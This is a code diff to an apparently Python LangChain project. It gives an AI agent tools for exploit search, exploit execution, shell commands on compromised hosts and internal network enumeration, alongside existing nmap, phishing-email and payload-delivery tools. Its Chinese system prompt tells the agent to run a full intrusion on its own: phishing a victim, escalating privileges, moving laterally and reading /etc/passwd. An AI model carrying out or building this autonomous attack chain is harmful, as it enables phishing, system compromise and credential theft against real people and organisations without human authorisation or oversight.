@@ -95,8 +95,69 @@ async def send_payload_to_victim(victim_url: str, company: str, malicious_link: 
     except Exception as e:
         return f"执行send_payload_to_victim工具时出错: {e}"
 
+@tool
+async def get_network_info(session_id: str) -> str:
+    """获取当前会话可达的内网主机信息。"""
+    try:
+        async with attack_service_client.client as client:
+            response = await client.call_tool(
+                "get_network_info",
+                arguments={"session_id": session_id}
+            )
+        return "\n".join([b.text for b in response.content if hasattr(b, "text")])
+    except Exception as e:
+        return f"执行get_network_info工具时出错: {e}"
+
+@tool
+async def search_exploit(service: str, version: str) -> str:
+    """搜索可利用漏洞模块。"""
+    try:
+        async with attack_service_client.client as client:
+            response = await client.call_tool(
+                "search_exploit",
+                arguments={"service": service, "version": version}
+            )
+        return "\n".join([b.text for b in response.content if hasattr(b, "text")])
+    except Exception as e:
+        return f"执行search_exploit工具时出错: {e}"
+
+@tool
+async def execute_exploit_module(module: str, target: str) -> str:
+    """执行指定漏洞利用模块，返回 session_id"""
+    try:
+        async with attack_service_client.client as client:
+            response = await client.call_tool(
+                "execute_exploit_module",
+                arguments={"module": module, "target": target}
+            )
+        return "\n".join([b.text for b in response.content if hasattr(b, "text")])
+    except Exception as e:
+        return f"执行execute_exploit_module工具时出错: {e}"
+
+@tool
+async def execute_shell_command(session_id: str, command: str) -> str:
+    """在已控目标上执行命令。"""
+    try:
+        async with attack_service_client.client as client:
+            response = await client.call_tool(
+                "execute_shell_command",
+                arguments={"session_id": session_id, "command": command}
+            )
+        return "\n".join([b.text for b in response.content if hasattr(b, "text")])
+    except Exception as e:
+        return f"执行execute_shell_command工具时出错: {e}"
+
 # 将所有定义好的工具放入一个列表
-tools = [run_nmap, fetch_url_content, craft_phishing_email, send_payload_to_victim]
+tools = [
+    run_nmap,
+    fetch_url_content,
+    craft_phishing_email,
+    send_payload_to_victim,
+    search_exploit,
+    execute_exploit_module,
+    execute_shell_command,
+    get_network_info,
+]
 
 # --- 定义Agent ---
 # 这是给Agent的指令，告诉它它的角色、能力和目标
@@ -109,7 +170,9 @@ prompt = ChatPromptTemplate.from_messages(
 2.  **规划**: 根据你侦察到的公司名称，准备进行钓鱼邮件攻击。
 3.  **执行**: 调用 `craft_phishing_email` 工具来生成一封针对性的邮件。
 4.  **交付**: 调用 `send_payload_to_victim` 工具，将生成的邮件内容发送给受害者，完成最终攻击。
-5.  **报告**: 将交付工具返回的最终结果作为你的最终答案。
+5.  **权限提升**: 一旦获取到受害者凭据，调用 `search_exploit` → `execute_exploit_module` 获取 `session_id`。
+6.  **横向移动**: 使用 `get_network_info` 枚举内网，再对其中一台主机执行 `execute_shell_command` (例如 `cat /etc/passwd`)。
+7.  **报告**: 把横向移动的最终命令输出作为最终答案。
 
 你必须严格按照工具的定义来使用它们，并自主完成整个流程。"""),
         ("human", "{input}"),
